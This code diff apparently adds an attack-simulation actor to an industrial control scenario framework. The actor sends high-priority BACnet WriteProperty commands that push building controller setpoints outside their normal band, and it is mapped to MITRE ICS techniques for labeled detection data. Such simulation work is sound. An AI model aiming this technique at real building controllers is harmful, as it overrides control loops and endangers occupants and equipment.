@@ -1409,3 +1409,104 @@ class BacnetClient(Actor):
             sock = rt.clients.pop(("bacnet", host.id), None)
             if sock is not None:
                 sock.close()
+
+
+@register
+class BacnetWriteInjection(Actor):
+    """Unauthorized BACnet control from a host outside the approved BMS path: the attacker sends
+    WriteProperty confirmed requests at a high command priority to commandable setpoints on a
+    building controller, driving them out of their normal operating band. The controller accepts
+    the commands and writes the new present value; no BMS operator requested the override. MITRE
+    ATT&CK for ICS: Unauthorized Command Message (T0855) and Modify Parameter (T0836)."""
+
+    type = "bacnet.write_injection"
+
+    def plan(self) -> None:
+        plan, rng = self.plan_, self.rng
+        host = self.hosts[0]
+        target = rng.choice(plan.topology.select(self.param("targets")))
+        server, controller = serving_controller(plan, target.id)
+        self.servers = {target.id: server}
+        priority = int(self.param("priority", 1))
+        if not 1 <= priority <= PRIORITIES or priority == MINIMUM_ON_OFF:
+            raise ScenarioError(f"{self.type} '{self.id}': priority must lie in 1..16 and not be 6 "
+                                "(minimum on/off)")
+        # Commandable analog setpoints with a normal band: the attacker commands each one to a value
+        # outside its band (present-value through the priority array), disabling the control loop.
+        candidates = sorted((o for o in controller.objects if o.type == ANALOG_VALUE
+                             and controller.commandable(o) and o.point.normal
+                             and o.point.type == "float32" and o.point.name.endswith("_sp")),
+                            key=lambda o: o.instance)
+        if not candidates:
+            raise ScenarioError(f"{self.type} '{self.id}': controller '{controller.host_id}' has no "
+                                "commandable setpoint with a normal band to override")
+        count = max(1, min(int(self.param("writes", 1)), len(candidates)))
+        chosen = sorted(rng.sample(candidates, count), key=lambda o: o.instance)
+        start_lo, start_hi = self.span(self.param("start", [0.35, 0.6]))
+        spread = min(float(self.param("spread", 120)), plan.duration * 0.4)
+        t0 = plan.duration * rng.uniform(start_lo, start_hi)
+        t0 = min(t0, max(plan.duration - spread - 30, plan.duration * 0.1))
+
+        invoke = rng.randrange(256)
+        commands, first = [], None
+        t = t0 + rng.uniform(0.05, 0.3)
+        for index, obj in enumerate(chosen):
+            at = t if count == 1 else t0 + rng.uniform(0.1, 0.4) + index * (spread / max(count - 1, 1))
+            point = obj.point
+            lo, hi = point.normal
+            span = max(hi - lo, abs(point.nominal), 1.0)
+            value = point.typed(hi + rng.uniform(0.5, 1.0) * span)   # above the normal band
+            write = plan.add(at, self.id, host.id, "bacnet.write", target=target.id,
+                             object=list(obj.key), value=value, priority=priority, invoke=invoke)
+            invoke = (invoke + 1) % 256
+            first = first or write
+            commands.append({"object": {"type": OBJECT_TYPE_NAMES[obj.type], "instance": obj.instance},
+                             "point": point.name, "desc": obj.description, "unit": point.unit,
+                             "value": value, "normal": list(point.normal), "priority": priority,
+                             "request": action_ref(write)})
+            plan.event(write, self.id, f"Override {point.name} to {value} on {target.id}",
+                       ["T0855", "T0836"], point=point.name, object_type=OBJECT_TYPE_NAMES[obj.type],
+                       instance=obj.instance, value=value, priority=priority)
+
+        plan.facts[self.id] = {
+            "source": host_ref(host.id),
+            "target": host_ref(target.id),
+            "device_instance": controller.instance,
+            "command_count": len(commands),
+            "priority": priority,
+            "commands": commands,
+            "overridden_points": [c["point"] for c in commands],
+            "objects": [f'{c["object"]["type"]}:{c["object"]["instance"]}' for c in commands],
+            "instances": [c["object"]["instance"] for c in commands],
+            "first_command": action_ref(first),
+        }
+
+    def _socket(self, rt, host_id: str) -> socket.socket:
+        key = (self.id, host_id)
+        sock = rt.clients.get(key)
+        if sock is None:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            try:
+                sock.bind((rt.loopback(host_id), ports.BACNET))
+                sock.settimeout(TIMEOUT_S)
+            except BaseException:
+                sock.close()
+                raise
+            rt.clients[key] = sock
+        return sock
+
+    def execute(self, action, rt) -> None:
+        if action.op != "bacnet.write":
+            raise ValueError(f"unknown op {action.op}")
+        a = action.args
+        sock = self._socket(rt, action.host)
+        target = (rt.loopback(a["target"]), ports.BACNET)
+        request = write_property(a["invoke"], tuple(a["object"]), PRESENT_VALUE,
+                                 command_value(a["object"][0], a["value"]), a["priority"])
+        reply = _transact(sock, target, request, a["invoke"])
+        if reply[0] >> 4 != SIMPLE_ACK:
+            raise RuntimeError(f"{action.op} answered with APDU type {reply[0] >> 4}: {reply.hex()}")
+
+    def close(self, rt) -> None:
+        for key in [k for k in rt.clients if k[0] == self.id]:
+            rt.clients.pop(key).close()
